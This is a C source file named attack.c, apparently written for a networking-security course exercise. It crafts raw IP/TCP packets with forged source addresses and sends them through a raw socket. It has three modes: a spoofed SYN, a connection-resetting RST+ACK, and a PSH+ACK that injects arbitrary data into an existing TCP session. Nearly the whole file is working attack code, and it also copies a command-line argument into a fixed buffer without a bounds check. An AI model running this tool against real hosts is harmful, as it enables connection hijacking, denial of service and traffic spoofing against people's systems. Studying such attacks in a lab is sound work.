// attack.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <stdint.h>

// ------------ Professor-style checksum functions ------------

// IP checksum over header only (20 bytes -> 10 words)
unsigned short csum_ip(unsigned short *buf, int nwords) {
    unsigned long sum;
    for (sum = 0; nwords > 0; nwords--) {
        sum += *buf++;
    }
    while (sum >> 16) {
        sum = (sum >> 16) + (sum & 0xFFFF);
    }
    return ~sum;
}

// TCP checksum with pseudo-header.
// buf points to start of IP header.
// nwords = # of 2-byte words in TCP payload only.
unsigned short csum_tcp(unsigned short *buf, int nwords) {
    unsigned long sum = 0;

    // IP src/dst are words 6..9 (because 20-byte IP header = 10 words)
    sum += buf[6];
    sum += buf[7];
    sum += buf[8];
    sum += buf[9];

    sum += htons(6);                    // Protocol = TCP
    sum += htons(20 + (nwords << 1));   // TCP header (20 bytes) + payload bytes

    // TCP header starts at word index 10 (after 20-byte IP header)
    // 10 words of TCP header + nwords payload words
    for (int i = 10; i < 20 + nwords; ++i) {
        sum += buf[i];
    }

    while (sum >> 16) {
        sum = (sum >> 16) + (sum & 0xFFFF);
    }
    return ~sum;
}

int main(int argc, char *argv[]) {
    if (argc < 8) {
        fprintf(stderr,
            "Usage:\n"
            "  SYN  attack : sudo ./attack S <src_ip> <src_port> <dst_ip> <dst_port> <seq> <ack>\n"
            "  RST  attack : sudo ./attack R <src_ip> <src_port> <dst_ip> <dst_port> <seq> <ack>\n"
            "  DATA attack: sudo ./attack D <src_ip> <src_port> <dst_ip> <dst_port> <seq> <ack> <payload>\n");
        return 1;
    }

    char mode     = argv[1][0];
    char *src_ip  = argv[2];
    int src_port  = atoi(argv[3]);
    char *dst_ip  = argv[4];
    int dst_port  = atoi(argv[5]);
    uint32_t seq  = (uint32_t)strtoul(argv[6], NULL, 10);
    uint32_t ack  = (uint32_t)strtoul(argv[7], NULL, 10);

    char packet[4096];
    memset(packet, 0, sizeof(packet));

    struct iphdr  *iph  = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
    char *data          = packet + sizeof(struct iphdr) + sizeof(struct tcphdr);

    int payload_len = 0;
    if (mode == 'D') {
        if (argc < 9) {
            fprintf(stderr, "DATA attack requires payload.\n");
            return 1;
        }
        strcpy(data, argv[8]);
        payload_len = (int)strlen(argv[8]);
    }

    // ------------- Build IP header (20 bytes) -------------
    iph->ihl      = 5;       // 5 * 4 = 20 bytes
    iph->version  = 4;
    iph->tos      = 0;
    iph->tot_len  = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len);
    iph->id       = htons(54321);
    iph->frag_off = 0;
    iph->ttl      = 64;
    iph->protocol = 6;       // TCP
    iph->saddr    = inet_addr(src_ip);
    iph->daddr    = inet_addr(dst_ip);
    iph->check    = 0;       // filled in below

    // ------------- Build TCP header (20 bytes) -------------
    tcph->source  = htons(src_port);
    tcph->dest    = htons(dst_port);
    tcph->seq     = htonl(seq);
    tcph->ack_seq = htonl(ack);
    tcph->doff    = 5;       // 5 * 4 = 20 bytes
    tcph->window  = htons(65535);
    tcph->urg_ptr = 0;

    // Clear flags
    tcph->fin = tcph->syn = tcph->rst = tcph->psh =
    tcph->ack = tcph->urg = 0;

    if (mode == 'S') {
        // Attack 1: spoofed SYN
        tcph->syn = 1;
        // ack can be 0 here
    } else if (mode == 'R') {
        // Attack 2: RST+ACK
        tcph->rst = 1;
        tcph->ack = 1;
    } else if (mode == 'D') {
        // Attack 3: PSH+ACK with injected data
        tcph->psh = 1;
        tcph->ack = 1;
    } else {
        fprintf(stderr, "Unknown mode %c (use S, R, or D)\n", mode);
        return 1;
    }

    // ------------- Checksums -------------
    unsigned short *w = (unsigned short *)packet;

    // IP header checksum (10 words = 20 bytes)
    iph->check = 0;
    iph->check = csum_ip(w, 10);

    // TCP checksum: payload only in words (rounded up)
    int nwords = (payload_len + 1) / 2;   // 0 for no payload
    tcph->check = 0;
    tcph->check = csum_tcp(w, nwords);

    // ------------- Send via raw TCP socket -------------
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (s < 0) {
        perror("socket");
        return 1;
    }

    int one = 1;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt IP_HDRINCL");
        close(s);
        return 1;
    }

    struct sockaddr_in sin;
    sin.sin_family      = AF_INET;
    sin.sin_port        = htons(dst_port);
    sin.sin_addr.s_addr = inet_addr(dst_ip);

    int pkt_len = ntohs(iph->tot_len);

    if (sendto(s, packet, pkt_len, 0,
               (struct sockaddr *)&sin, sizeof(sin)) < 0) {
        perror("sendto");
        close(s);
        return 1;
    }

    printf("Sent %c: %s:%d -> %s:%d  seq=%u ack=%u payload_len=%d\n",
           mode, src_ip, src_port, dst_ip, dst_port, seq, ack, payload_len);

    close(s);
    return 0;
}
